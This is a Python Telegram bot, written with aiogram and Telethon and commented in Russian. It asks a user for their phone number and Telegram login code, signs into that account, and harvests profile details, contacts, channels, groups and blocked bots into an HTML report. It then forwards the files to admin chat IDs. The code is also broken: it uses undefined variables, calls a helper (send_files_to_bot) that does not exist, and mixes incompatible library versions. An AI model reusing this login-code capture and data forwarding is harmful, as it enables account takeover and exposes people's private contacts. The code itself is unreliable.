import logging
import asyncio
import os
from aiogram import Bot, Dispatcher, types, F
from aiogram.dispatcher.filters import Command
from aiogram.types import ParseMode
from aiogram.utils import executor
from telethon import TelegramClient
from dotenv import load_dotenv
from defunc import (
    get_user_info,
    get_blocked_bot,
    make_list_of_channels,
    get_and_save_contacts,
    save_about_channels,
    generate_html_report
)

# Загрузка переменных окружения из файла .env
load_dotenv()

# Получение значений из переменных окружения
api_id = os.getenv("API_ID")
api_hash = os.getenv("API_HASH")
bot_token = os.getenv("BOT_TOKEN")
allowed_users_str = os.getenv("ALLOWED_USERS")
admin_chat_ids_str = os.getenv("ADMIN_CHAT_IDS")
allowed_users = [int(user_id) for user_id in allowed_users_str.split(",")]
admin_chat_ids = [int(chat_id) for chat_id in admin_chat_ids_str.split(",")]

# Создаем TelegramClient и Bot
client = TelegramClient('session_name', api_id, api_hash)
bot = Bot(token=bot_token)
dp = Dispatcher(bot)

# Логирование
logging.basicConfig(level=logging.INFO)

# Словарь для хранения состояния пользователя
user_state = {}

# Обработчики сообщений
@dp.message(Command(commands=['start']))
async def send_welcome(message: types.Message):
    if message.from_user.id in allowed_users:
        await message.answer("Добро пожаловать! Пожалуйста, введите ваш номер телефона в международном формате.")
    else:
        await message.answer("Извините, вы не авторизованы для использования этого бота.")

@dp.message(F.text.startswith('+'))
async def get_phone_number(message: types.Message):
    if message.from_user.id not in allowed_users:
        return
    phone_number = message.text
    user_state[message.from_user.id] = {'phone_number': phone_number}
    try:
        await client.connect()
        phone_code_hash = await client.send_code_request(phone_number)
        user_state[message.from_user.id]['phone_code_hash'] = phone_code_hash
        await message.answer("Код отправлен на ваш номер. Пожалуйста, введите код, который вы получили.")
    except Exception as e:
        await message.answer(f"Произошла ошибка: {e}")

@dp.message(F.text.regexp(r'^\d{5,}$'))
async def get_code(message: types.Message):
    if message.from_user.id not in user_state or 'phone_code_hash' not in user_state[message.from_user.id]:
        return
    code = message.text
    phone_number = user_state[message.from_user.id]['phone_number']
    phone_code_hash = user_state[message.from_user.id]['phone_code_hash']
    user_chat_id = message.from_user.id
    try:
        await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash)
        await message.answer("Успешная авторизация!")

        # После успешной авторизации выполнение функций
        selection = '0'

        # Получаем информацию о пользователе
        userid, userinfo, firstname, lastname, username = get_user_info(client, phone_number, selection)

        # Получаем информацию о заблокированных ботах
        count_blocked_bot, earliest_date, latest_date, blocked_bot_info, blocked_bot_info_html, user_bots, user_bots_html = get_blocked_bot(client, selection)

        # Формируем списки каналов и чатов
        groups, i, all_info, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html = make_list_of_channels(delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, selection, client)

        # Получаем и сохраняем контакты пользователя
        total_contacts, total_contacts_with_phone, total_mutual_contacts = get_and_save_contacts(client, phone_number, userinfo, userid)

        # Сохраняем информацию о каналах и группах пользователя
        save_about_channels(phone_number, userid, firstname, lastname, username, openchannel_count, opengroup_count, closechannel_count, closegroup_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, openchannels, closechannels, openchats, closechats, delgroups, closegroupdel_count)

        # Формируем отчет в формате HTML
        generate_html_report(phone_number, userid, userinfo, firstname, lastname, username, total_contacts, total_contacts_with_phone, total_mutual_contacts, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html, blocked_bot_info_html, user_bots_html)

        # Отправляем файлы
        await send_files_to_bot(bot, admin_chat_ids, user_chat_id)

    except Exception as e:
        await message.answer(f"Произошла ошибка: {e}")
    finally:
        await client.disconnect()
        user_state.pop(message.from_user.id, None)

# Запуск бота
if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
